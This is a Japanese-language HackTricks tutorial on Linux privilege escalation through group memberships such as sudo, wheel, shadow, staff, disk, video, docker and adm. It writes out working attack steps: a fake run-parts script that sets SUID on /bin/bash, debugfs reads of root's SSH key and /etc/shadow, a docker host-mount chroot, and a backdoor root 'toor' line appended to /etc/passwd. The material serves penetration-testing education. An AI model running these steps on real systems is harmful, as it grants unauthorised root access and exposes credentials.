# Interesting Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin グループ

### **PE - Method 1**

**ときには**、システムの **/etc/sudoers** ポリシー（またはそこから読み込まれるファイル）に、次のようなエントリが含まれていることがあります:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

これは、いずれかのエントリに該当するユーザーが、`sudo` を通じて任意の対象ユーザーとして任意のコマンドを実行できることを意味します（ポリシーのその他の条件に従います）。<sup>[[3]](#references)</sup>

この場合、**rootになるには、次を実行するだけです**:

```
sudo su
```

`sudo -l` でユーザー名のみを指定する制限付きの `adduser` 実行が許可されている場合、まだ存在しない同名のプライマリグループが作成されるか確認してください。そのグループに属する新しいアカウントは、有効な sudoers ポリシーで `%group` に権限が付与されていれば、権限を得られる可能性があります。これを権限昇格経路とみなす前に、グループの作成動作とグループルールの両方を確認してください。アカウントを作成するとシステムが変更されるため、まずポリシーを調べてください。

### PE - 方法 2

すべての suid バイナリを見つけ、**Pkexec** があるか確認します。

```bash
find / -perm -4000 2>/dev/null
```

**pkexec が SUID バイナリ**の場合、polkit が要求されたアクションを認可したときに限り、別のユーザーとしてプログラムを実行できます。SUID ビットがあるだけで root 権限が保証されるわけではありません。**sudo** または **admin** グループへの所属だけで十分だと決めつけず、インストール済みのポリシーと対象セッションの認可を確認してください。<sup>[[4]](#references)[[5]](#references)</sup>

別経路である [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) については、まず `pkexec` が実行可能な **root 所有の SUID** ファイルであることを確認してください。そのビットがないインストール済みバイナリは、アドバイザリで説明されているローカル SUID 権限昇格には該当しません。上流のバージョン文字列は手掛かりにすぎません。ディストリビューションは[古いパッケージバージョンに修正をバックポートする](https://ubuntu.com/security/CVE-2021-4034)ことがあるため、脆弱だと判断する前に、インストール済みのベンダーパッケージと緩和策を確認してください。

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) は別の polkit 経路であり、D-Bus の認可レースであって、`pkexec` の SUID 脆弱性ではありません。インストール済みのベンダー製 polkit パッケージと、アクセス可能な特権 D-Bus アクションによって有用な変更を加えられるかを確認してください。アカウント作成経路には AccountsService などの適切なサービスも必要であり、新しいグループが sudo を利用できるかどうかは、有効な sudo ポリシーによって決まります。特にベンダーが[修正をバックポートしている](https://access.redhat.com/security/cve/cve-2021-3560)場合、報告された polkit のバージョンやサービスのインストールだけでは、候補にすぎません。受動的な列挙でレースを発生させてはいけません。

古い Local Authority バックエンドをまだ使用しているディストリビューションでは、次のコマンドでグループルールを調べてください。

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

ディストリビューションによって関連するグループ名やデフォルト設定は異なります。この用途でグループが役立つのは、ローカルポリシーでそのグループが指定されている場合に限られます。<sup>[[5]](#references)</sup>

**rootになるには、次を実行します**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

**pkexec** を実行しようとして、次の **エラー** が表示された場合:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

SSH セッションに認証エージェントが登録されていない場合、ポリシー上は許可される操作でも、`pkexec` がこのエラーで失敗することがあります。polkit は、デスクトップ以外のセッション向けのテキスト認証エージェントとして `pkttyagent` を案内しています。実際の動作はバージョンやディストリビューションによって異なるため、ローカルのポリシーとエージェントの設定を確認してください。影響を受ける一部の NixOS バージョンで、回避策として**異なる2つの SSH セッション**を使う方法が報告されています。<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

あるアカウントによる `su` へのアクセスを拒否する ACL が制御するのは、その実行ファイルであり、管理者権限が必要な操作に至るすべての経路ではありません。管理者の認証情報が別途漏えいしている場合は、`systemd-run` を使って一時的なシステムサービスを起動するような別の操作が、実効 polkit ポリシーで許可されているか、認証エージェントがどのユーザーを受け入れるか、そして起動されるサービスがどのユーザーとして実行されるかを確認してください。[Polkit は、セッション所有者としての認証と管理者としての認証を区別しています](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)。また、[systemd-run はシステムマネージャーに一時的なサービスを要求できます](https://systemd.io/CONTROL_GROUP_INTERFACE/)。履歴の記録、インストール済みのコマンド、または読み取り可能なポリシーファイルだけでは、認可や認証情報の有効性は確認できません。受動的な確認では、認証情報を入力したり、ユニットを起動したりしないでください。

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel Group

sudoers ポリシーに次のエントリが含まれている場合もあります:

```
%wheel	ALL=(ALL:ALL) ALL
```

この場合、そのエントリに一致するユーザーは、（ポリシーの他の条件に従って）`sudo` を通じて、任意の対象ユーザーとして任意のコマンドを実行できます。<sup>[[3]](#references)</sup>

この場合、**root になるには、次のコマンドを実行するだけです**:

```
sudo su
```

## Shadow Group

権限が付与されているシステムでは、**shadow** グループのユーザーは **/etc/shadow** を**読み取り**できます。対象の実際のモードと ACL を確認してください:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

それでは、ファイルを読んで、**いくつかの hash をクラックしてみましょう**。

hash をトリアージする際のロック状態についての補足:
- `!` または `*` を含むエントリは、通常、パスワードログインでは対話的に使用できません。
- `!hash` はパスワードがロックされていたことを意味します。残りの文字列は、ロック前のパスワードフィールドの内容を表します。
- `*` を含むフィールドは有効な `crypt(3)` hash ではなく、UNIX パスワードでのログインを防ぎます。この情報から、以前にパスワードが設定されていたかどうかを推測してはいけません。
直接ログインがブロックされていても、アカウントの分類に役立ちます。<sup>[[6]](#references)</sup>

## Staff Group

**staff**: ユーザーが root 権限なしでシステム（`/usr/local`）にローカルな変更を加えられるようにします（`/usr/local/bin` 内の実行ファイルはすべてのユーザーの PATH 変数に含まれており、同名の実行ファイルが `/bin` や `/usr/bin` にある場合、それらを「上書き」できる点に注意してください）。監視やセキュリティにより関連するグループ「adm」と比較してください。<sup>[[2]](#references)[[7]](#references)</sup>

以下の例のように、`/usr/local/bin` が `PATH` 内で `/usr/bin` より前にある Debian の設定では、修飾なしのコマンドはまず `/usr/local/bin` 内のコピーに解決されます。対象システム上で実際の `PATH` を確認してください。

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

特権プロセスが、書き込み可能な `/usr/local/bin` を通じてパスを指定せずにコマンドを解決する場合、そのコマンドを置き換えるとプロセスの権限で実行される可能性があります。テストする前に、実際のパスと実行条件を確認してください。

Ubuntu システムでは、ログイン時に `pam_motd` が root として `run-parts --lsbsysinit` を介して実行可能なスクリプトを実行します。cron ジョブも `run-parts` を使用する場合がありますが、これはディストリビューションと設定によって異なります。<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

新たに SSH ログインした際、`pspy`を使うと、このパスが実際にターゲット上で呼び出されているか確認できます。root権限なしでプロセスのコマンドラインを監視できます。<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## ディスクグループ

**disk** グループのメンバーはブロックデバイスへのraw accessが許可される場合があり、多くの場合、**root accessに近い権限**を得られます。Debianではほぼrootと同等と説明されていますが、対象システム上の実際のデバイス権限とストレージ構成を確認してください。<sup>[[7]](#references)</sup>

一般的なデバイスパスには `/dev/sd*` がありますが、NVMeなどでは異なる名前が使われます。

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` は ext2/ext3/ext4 ファイルシステム上で動作します。上記の `/root` や `/etc/shadow` のようなパスは、開いたファイルシステム内のファイルを指し、`dump` の2番目の引数はネイティブファイルシステム上の出力パスです。<sup>[[8]](#references)</sup> たとえば、開いたファイルシステムから `/tmp/asd1.txt` をネイティブファイルシステム上の `/tmp/asd2.txt` に抽出します。

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

`-w` オプションはファイルシステムを読み書き可能な状態で開き、`write` コマンドはネイティブファイルを開いたファイルシステムにコピーします。マウント中の稼働中ファイルシステムでは使用しないでください。直接編集するとファイルシステムが破損する可能性があるため、可能であればオフラインイメージを使用してください。<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Video グループ

コマンド `w` を使うと、**システムにログインしているユーザー**を確認でき、次のような出力が表示されます。<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

**tty1** エントリは最初の Linux 仮想コンソールを示しますが、それだけでユーザーが物理的にマシンの前にいることを証明するものではありません。特にコンテナやその他の環境では注意が必要です。<sup>[[21]](#references)</sup>

読み取り可能な framebuffer デバイスを公開しているシステムでは、**video** グループへの所属により、そのデバイスへのアクセスが許可される場合があります。Linux framebuffer インターフェースのドキュメントでは、`/dev/fb0` は画面のスナップショットを取得するためにコピーできる読み取り可能なメモリデバイスとして説明されています。`/sys/class/graphics/fb0/virtual_size` パスを利用できるのは、その fbdev sysfs 属性が存在する場合に限られるため、まず対象を確認してください。<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

インストールされている **GIMP** のバージョンに raw-data importer がある場合は、それを使って **`screen.raw`** を開きます。対応状況や操作項目はバージョンとプラグインによって異なります。<sup>[[22]](#references)</sup>

![Disk Group - Video Group: raw imageを開くにはGIMPを使用し、screen.rawファイルを選択して、ファイルの種類としてRaw image dataを選択します](<../../../images/image (463).png>)

画像の Width と Height をフレームバッファのジオメトリに合わせます。出力が判読できるようになるまで、利用可能なピクセル形式/Image Typesを試してください。<sup>[[9]](#references)</sup>

![Disk Group - Video Group: 次に、WidthとHeightを画面で使われている値に変更し、さまざまなImage Typesを確認して、画面が最もよく表示されるものを選択します](<../../../images/image (317).png>)

## Rootグループ

**root** グループに所属していても root の UID が付与されるわけではありませんが、`root` が所有するグループ書き込み可能なファイルは、特権サービスやライブラリが利用する場合、調査対象になることがあります。権限昇格の経路と判断する前に、ファイルの実際の権限と用途を確認してください。

**root グループのメンバーが変更できるファイルを確認する**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

`docker` グループに所属すると、標準的な rootful インストールでは Docker daemon に対する root レベルのアクセスが付与されます。bind mount はデフォルトで読み書き可能なため、その daemon を制御できるユーザーはホストの `/` をコンテナにマウントしてホスト上のファイルを変更できます。これにより、実質的にホスト上の root 権限を得られます。<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

グループメンバーシップが、`/etc/group`、`/etc/gshadow`、現在のプロセストークン間で一致していない場合があります。`id -nG` にユーザーが表示されないのに `newgrp docker` が成功する場合は、新しいシェルで `id` が示すグループを確認し、Docker socket に実際に書き込み可能か、rootful daemon が稼働しているかをテストしてください。グループ名だけでは、ホストを制御できるとは限りません。自動化した `newgrp` のプローブには制限時間を設け、パスワードプロンプトで列挙が停止しないようにしてください。

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

最後に、先ほどの提案が気に入らない場合や、何らかの理由（docker api firewall?）でうまくいかない場合は、ここで説明されているように、**privileged containerを実行してそこからescapeする**方法もあります。

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

docker socketへの書き込み権限がある場合は、[**docker socketを悪用してprivilege escalationする方法についてのこの記事**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**を読んでください。**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd グループ

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm グループ

通常、**`adm`グループのメンバー**には、_/var/log/_内の**ログファイルを読み取る**権限があります。\
そのため、このグループに属するユーザーを侵害した場合は、必ず**ログを確認**してください。<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail グループ

これらのグループの意味は、サービスやディストリビューションによって異なります。Debianでは、`backup`は委任されたバックアップ／復元、`lp`はプリンターデーモン、`mail`は`/var/mail`に関するものとして説明されています。メンバーシップをprivilege pathとみなす前に、ローカルの権限を確認してください。<sup>[[7]](#references)</sup>

これらは、rootへの直接的な経路というより、**credential discovery**の手掛かりとなることがよくあります。
- **backup**: 設定ファイル、鍵、DB dump、tokenを含むアーカイブが見つかる可能性があります。
- **operator**: プラットフォーム固有の運用アクセスにより、機密性の高い実行時データがleakする可能性があります。
- **lp**: 印刷キューやスプールに、文書の内容が含まれている可能性があります。
- **mail**: メールスプールから、パスワードリセットリンク、OTP、内部のcredentialが見つかる可能性があります。

このグループへの所属は、価値の高いデータ露出の発見事項として扱い、パスワードやtokenの再利用を通じてpivotしてください。

## Auth グループ

OpenBSDでは、S/Keyが設定されている場合、`/etc/skey`は`root:auth`が所有し、そのレコードへのアクセスには`auth`グループが必要です。YubiKeyのレコードは`/var/db/yubikey`に保存されます。<sup>[[16]](#references)[[17]](#references)</sup> S/KeyまたはYubiKeyが有効な脆弱なOpenBSD 6.6の設定では、`auth`権限を持つローカルユーザーがrootになれる場合がありました。Qualysは前提条件とexploit chainを解説しており、リンク先のPoCはその手法を実装しています。<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [GUI sessionを使わないpkexec/pkttyagent認証（NixOS issue #18012）](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [システムグループ - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Debianセキュリティマニュアル](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linuxマニュアルページ](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [フレームバッファデバイス — Linuxカーネルドキュメント](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — 非特権Linuxプロセスの監視ツール](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engineのセキュリティ](https://docs.docker.com/engine/security/)
- [14] [root以外のユーザーとしてDockerを管理する](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [コンテナの実行 — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSDマニュアルページ](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSDマニュアルページ](https://man.openbsd.org/login_yubikey.8)
- [18] [OpenBSDの認証脆弱性 — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — ローカルexploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux割り当て済みデバイス（4.x以降のバージョン）](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [画像のインポートとエクスポート — GIMPドキュメント](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
